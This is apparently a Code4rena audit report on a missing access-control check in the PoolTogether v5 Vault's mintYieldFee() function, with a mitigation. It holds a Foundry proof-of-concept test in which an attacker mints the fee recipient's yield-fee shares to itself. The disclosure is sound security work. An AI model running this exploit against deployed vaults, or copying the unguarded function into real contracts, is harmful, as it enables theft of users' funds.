# Original link
https://github.com/code-423n4/2023-07-pooltogether-findings/issues/100
# Lines of code

https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L394
https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L573
https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1229


# Vulnerability details

## Impact

When a [liquidate()](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L550) exists, there is an increase of the [yield fee balance](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L573C1-L573C1), so the [_yieldFeeRecipient](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1229) can get those fees via [Vault.mintYieldFee()](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L394C12-L394C24) function. The problem is that the yield fee shares can be lost because there is not any restriction about who calls [Vault.mintYieldFee()](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L394C12-L394C24).

## Proof of Concept

The `mintYieldFee()` function does not have any protection that could be called only by [_yieldFeeRecipient](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L1229) or validation that the fees must be transferred only to the `yieldFeeRecipient`.

```javascript
File: Vault.sol
394:   function mintYieldFee(uint256 _shares, address _recipient) external {
395:     _requireVaultCollateralized();
396:     if (_shares > _yieldFeeTotalSupply) revert YieldFeeGTAvailable(_shares, _yieldFeeTotalSupply);
397: 
398:     _yieldFeeTotalSupply -= _shares;
399:     _mint(_recipient, _shares);
400: 
401:     emit MintYieldFee(msg.sender, _recipient, _shares);
402:   }
```

I created a test where the yield fee shares are extracted by an attacker causing the lost of the fee shares. Test steps:

1. Setup the liquidation scenario.
2. Assert Bob is the `YieldFeeRecipient` assigned by `setYieldFeeRecipient(bob)` function;
3. An attacker can call `mintYieldFee()` and extract the fee shares.
4. Bob has 0 vault shares. Attacker has the yieldFeesShares. The feeRecipient Bob lost the fee shares.

```javascript
// test/unit/Vault/Liquidate.t.sol:VaultLiquidateTest
// forge test --match-test "testLiquidateAndMintFeesToAnAttacker"
  function testLiquidateAndMintFeesToAnAttacker() external {
    // The mint yield fee can be extracted by anyone who calls mintYieldFee() causing the lost
    // of yield fee shares.
    // 1. Setup the liquidation scenario.
    // 2. Assert Bob is the YieldFeeRecipient assigned by setYieldFeeRecipient(bob) function;
    // 3. An attacker can call mintYieldFee() and extract the fee shares.
    // 4. Bob has 0 vault shares. Attacker has the yieldFeesShares.
    //
    // 1. Setup the liquidation scenario.
    //
    address attacker = address(1337);
    _setLiquidationPair();
    vault.setYieldFeePercentage(YIELD_FEE_PERCENTAGE);
    vault.setYieldFeeRecipient(bob);
    uint256 _amount = 1000e18;
    underlyingAsset.mint(address(this), _amount);
    _sponsor(underlyingAsset, vault, _amount, address(this));
    uint256 _yield = 10e18;
    _accrueYield(underlyingAsset, yieldVault, _yield);
    vm.startPrank(alice);
    prizeToken.mint(alice, 1000e18);
    uint256 _liquidatedYield = vault.liquidatableBalanceOf(address(vault));
    _liquidate(liquidationRouter, liquidationPair, prizeToken, _liquidatedYield, alice);
    vm.stopPrank();
    uint256 _yieldFeeShares = _getYieldFeeShares(_liquidatedYield, YIELD_FEE_PERCENTAGE);
    assertEq(vault.balanceOf(bob), 0);
    assertEq(vault.balanceOf(attacker), 0);
    assertEq(vault.totalSupply(), _amount + _liquidatedYield);
    assertEq(vault.yieldFeeTotalSupply(), _yieldFeeShares);
    //
    // 2. Assert Bob is the YieldFeeRecipient assigned by setYieldFeeRecipient(bob) function
    //
    assertEq(vault.yieldFeeRecipient(), bob);
    //
    // 3. An attacker can call mintYieldFee and extract the fee shares.
    //
    vm.prank(attacker);
    vault.mintYieldFee(_yieldFeeShares, attacker);
    //
    // 4. Bob has 0 vault shares. Attacker has the yieldFeesShares.
    //
    assertEq(vault.balanceOf(bob), 0);
    assertEq(vault.balanceOf(attacker), _yieldFeeShares);
    assertEq(vault.totalSupply(), _amount + _liquidatedYield + _yieldFeeShares);
    assertEq(vault.yieldFeeTotalSupply(), 0);
  }
```

## Tools used

Manual review

## Recommended Mitigation Steps

Validates the `Vault.mintYieldFee()` function must be called only by the `yieldFeeRecipient()` or ensure the yield fees should be transferred only to the `yieldFeeRecipient()`.


## Assessed type

Access Control